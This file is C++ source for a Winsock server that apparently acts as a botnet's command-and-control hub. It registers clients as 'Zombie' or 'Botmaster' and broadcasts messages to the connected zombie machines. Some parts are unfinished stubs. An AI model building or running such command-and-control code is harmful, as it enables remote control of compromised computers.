#include "Server.h"

Server::Server(std::string ip, int port)
	: m_IpAddress(ip), m_Port(port)
{
}

bool Server::init()
{
	WSAData data;
	return !WSAStartup(MAKEWORD(2, 2), &data);
}

Server::~Server()
{
	cleanUp();
}

int Server::cleanUp()
{
	closesocket(m_Listening);
	for (SOCKET zombie : m_Zombies)
		closesocket(zombie);
	return WSACleanup();
}

bool Server::createListeningSocket()
{
	m_Listening = socket(AF_INET, SOCK_STREAM, 0);

	if (m_Listening != INVALID_SOCKET)
	{
		SOCKADDR_IN addr;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(m_Port);
		inet_pton(AF_INET, m_IpAddress.c_str(), &addr.sin_addr);

		int bindSocket = bind(m_Listening, (sockaddr*)&addr, sizeof(addr));
		if (bindSocket == SOCKET_ERROR)
		{
			std::cout << "Couldnt bind listening socket to address	Error code: " << WSAGetLastError() << std::endl;
			return false;
		}

		int listenSocket = listen(m_Listening, SOMAXCONN);
		if (listenSocket == SOCKET_ERROR)
		{
			std::cout << "Couldnt create listening socket	Error code: " << WSAGetLastError() << std::endl;
			return false;
		}

		std::cout << "Server listening..." << std::endl;
		return true;
	}
	else
	{
		std::cout << "Couldnt create socket	Error code: " << WSAGetLastError() << std::endl;
		return false;
	}
}

int Server::waitForConnection()
{
	SOCKET m_Client = accept(m_Listening, nullptr, nullptr);
	if (m_Client == INVALID_SOCKET)
		return WEIRDO;
	else
	{
		char buf[4096];
		if (recv(m_Client, buf, sizeof(buf), 0))
		{
			std::string tmp = buf;
			if (tmp.substr(0, 6) == "Zombie")
			{
				m_Zombies.push_back(m_Client);
				return ZOMBIE;
			}
			else if (tmp.substr(0, 9) == "Botmaster" && m_Botmaster == INVALID_SOCKET)
			{
				m_Botmaster = m_Client;
				return BOTMASTER;
			}
			else
			{
				return WEIRDO;
			}
		}
		else {
			return WEIRDO;	//todo endless loop stops server from doing things
		}
	}
}

void Server::sendToZombies(const std::string& msg)
{
	for (SOCKET zombie : m_Zombies)
		sendToZombie(zombie, msg);
}

bool Server::sendToZombie(SOCKET zombie, const std::string& msg)
{
	int sended = send(zombie, msg.c_str(), msg.size(), 0);
	if (sended == SOCKET_ERROR)
		return false;
	return true;
}

bool Server::sendToBotmaster(const std::string& msg)
{
	int sended = send(m_Botmaster, msg.c_str(), msg.size(), 0);
	if (sended == SOCKET_ERROR)
		return false;
	return true;
}

bool Server::receive()
{
	//int received = recv(m_Zom, m_Buf, sizeof(m_Buf), 0);
	//if (received == SOCKET_ERROR || received == 0)	//received == 0 means that the connection got closed gracefully
	//	return false;
	return true;
}

std::string Server::getMessage()
{
	return m_Buf;
}
